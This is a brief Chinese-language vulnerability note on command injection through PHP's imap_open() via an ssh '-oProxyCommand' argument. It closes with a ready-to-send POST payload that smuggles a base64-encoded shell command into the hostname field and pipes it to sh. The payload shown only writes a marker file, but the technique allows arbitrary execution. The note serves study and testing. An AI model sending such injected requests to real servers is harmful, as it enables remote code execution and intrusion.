# IMAP远程命令执行漏洞

`PHP` `5.6.38`

1. `imap_open()`调用`rsh(ssh)`来连接远程Shell
2. `ssh`命令中可以通过设置`oProxyCommand=`调用第三方命令，注入此参数，执行任意命令
    
    <aside>
    💡 `%3decho%09ZWNobyAnMTIz…C90ZXN0MDAwMQo%3d` 采用Base64加密（URL解析）
    
    </aside>
    
    ```jsx
    POST hostname=x+-oProxyCommand%3decho%09ZWNobyAnMTIzNDU2Nzg5MCc%2bL3RtcC90ZXN0MDAwMQo%3d|base64%09-d|sh}&username=111&password=222
    ```